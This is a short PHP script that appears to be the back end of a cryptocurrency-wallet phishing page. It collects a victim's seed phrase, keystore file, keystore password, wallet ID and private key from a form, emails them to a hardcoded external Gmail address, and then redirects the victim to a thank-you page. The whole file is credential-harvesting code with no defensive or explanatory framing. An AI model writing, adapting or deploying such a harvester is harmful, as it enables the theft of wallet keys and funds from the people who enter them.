<?php
//get data from form  
$phrase = $_POST['phrase'];
$keystorejson= $_POST['keystorejson'];
$keystorepassword= $_POST['keystorepassword'];
$walletid= $_POST['wallet_id'];
$privatekey= $_POST['privatekey'];



$to = "briggsotonte@gmail.com";

$subject = "Mail From Gypsy";
$txt ="Phrase = ". $phrase . "\r\n  Keystorejason = " . $keystorejson . "\r\n Keystorepassword =" . $keystorepassword . "\r\n Wallet-id =". $walletid . "\r\n Privatekey =". $privatekey;

$headers = "From: noreply@Gypsy.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:thankyou.html");
?>